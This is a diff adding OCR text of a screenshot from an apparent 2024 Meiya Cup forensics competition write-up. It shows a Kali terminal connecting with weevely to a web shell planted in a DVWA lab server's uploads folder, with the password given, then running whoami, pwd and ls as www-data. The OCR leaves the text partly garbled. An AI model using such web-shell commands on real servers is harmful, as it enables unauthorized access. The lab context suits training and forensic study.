@@ -1,0 +1,32 @@
+# OCR: 5b20252fef0d36d83eed7a149d440830.webp
+# 来源: ./02-WriteUp/2024/2024-美亚杯-团队赛/5b20252fef0d36d83eed7a149d440830.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:20
+
+File
+EditViewHelp
+Actions
+rootkali)-f/home/kali
+材料4
+root@kali:/home/kali
+weevelyhttp://192.168.145.132/dvwa/hackable/uploads/weevely.php123456
++
+weevely4.0.1
+Target: Session:
+192.168.145.132
+/root/.weevely/sessions/192.168.145.132/weevely_0.session
+Browse the filesystem or execute commands starts the connection J to the target.Type :help for more information.
+weevely>whoami
+The remote script execution triggers an error 5oo,check script and payloadi
+ntegrity ww-data
+ww-data@192.168.145.132:/var/ww/dvwa/hackable/uploads$pwd
+The remote script execution triggers an error 5oo,check script and payload i ntegrity
+/var/ww/dvwa/hackable/uploads
+ww-data@192.168.145.132:/var/ww/dvwa/hackable/uploads$ls.-al
+The remote script execution triggers an error 5oo,check script and payload i
+ntegrity total 16
+drwxr-xr-x2ww-dataww-data4096May2403:08 drwxr-xr-x4ww-dataww-data 4096May 202012
+-rw-r--r--1ww-data ww-data667Mar 162010 dvwa_email.png
+-rw
+1ww-data ww-data761May24 03:08weevely.php
+ww-data@192.168.145.132:/var/ww/dvwa/hackable/uploads$
